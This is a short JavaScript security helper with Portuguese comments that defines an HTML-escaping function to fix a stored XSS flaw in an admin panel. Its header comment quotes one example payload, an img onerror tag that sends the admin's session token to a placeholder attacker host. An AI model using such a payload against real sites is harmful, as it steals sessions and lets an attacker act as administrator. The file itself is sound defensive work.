/**
 * SEGURANCA.JS — escape de HTML para conteúdo digitado por qualquer
 * usuário (nome de cliente, email, nome de categoria, nome de meta,
 * descrição de lançamento, mensagem etc.) antes de ir para innerHTML.
 *
 * ⚠️ VULNERABILIDADE REAL ENCONTRADA NA AUDITORIA (XSS armazenado):
 * vários lugares do painel do admin montavam HTML assim:
 *
 *     `<p>${cliente.nome}</p>`
 *     `<button data-nome="${cliente.nome}">`
 *
 * `cliente.nome` é texto que o PRÓPRIO CLIENTE escolhe no cadastro —
 * nada no formulário de cadastro impede caracteres como `<` ou `"`.
 * Um cliente malicioso podia se cadastrar com o nome, por exemplo:
 *
 *     <img src=x onerror="fetch('https://SITE-DO-ATACANTE/?t='+localStorage.getItem('sb-...-auth-token'))">
 *
 * Esse nome fica salvo no banco normalmente. No instante em que o
 * ADMINISTRADOR abre "Clientes" ou "Dashboards", o navegador DO ADMIN
 * executa esse script — podendo roubar o token de sessão do admin
 * (armazenado no localStorage pelo Supabase) e, com ele, agir como
 * administrador. O mesmo valia para nome de categoria personalizada,
 * nome de meta e descrição de lançamento — todos digitados pelo
 * cliente e depois lidos pelo admin sem qualquer tratamento.
 *
 * A correção é escapar TODO texto de origem externa antes de colocá-lo
 * dentro de innerHTML ou de um atributo HTML. `escaparHtml` cobre os 5
 * caracteres que importam para isso (& < > " '). Use-a em qualquer
 * `${...}` que venha do banco/usuário dentro de um template de HTML.
 */
function escaparHtml(texto) {
  if (texto === null || texto === undefined) return '';
  return String(texto)
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
    .replaceAll("'", '&#39;');
}

console.log('✅ seguranca.js carregado (escaparHtml)');
